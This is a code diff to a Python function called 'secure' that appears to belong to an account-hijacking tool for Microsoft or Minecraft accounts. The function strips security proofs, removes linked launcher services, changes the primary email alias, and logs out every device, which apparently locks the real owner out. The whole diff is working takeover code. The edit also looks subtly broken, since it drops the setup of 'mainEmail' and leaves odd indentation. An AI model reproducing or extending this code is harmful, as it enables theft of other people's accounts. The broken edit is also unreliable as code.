@@ -119,14 +119,12 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     print("[+] - Removed all Proofs")
     
     # Third Party Launchers (Minecraft, Prism)
-    await removeServices(session)
+    await removeServices(session)   
 
-    mainEmail = None  # Will be set inside the recovery block if recovery=True
+    if recovery:
 
         securityParameters = json.loads(await securityInformation(session))
         print("[+] - Got Security Parameters")
-
-        mainEmail = None  # Defined here so it's available for ralias fallback below
 
         if securityParameters:
 
@@ -169,12 +167,22 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             accountInfo["email"] = f"{primaryEmail}@outlook.com"
             print(f"[+] - Changed Primary Alias")
         else:
-            accountInfo["email"] = mainEmail or accountInfo.get("email", "Unknown")
+            accountInfo["email"] = mainEmail
     else:
-        accountInfo["email"] = mainEmail or accountInfo.get("email", "Unknown")
+        accountInfo["email"] = mainEmail
         
     # Logout all devices
     await logoutAll(session, apicanary)
     print("[+] - Account has been secured")
 
     return accountInfo
+
+
+            
+
+    
+
+    
+        
+
+        
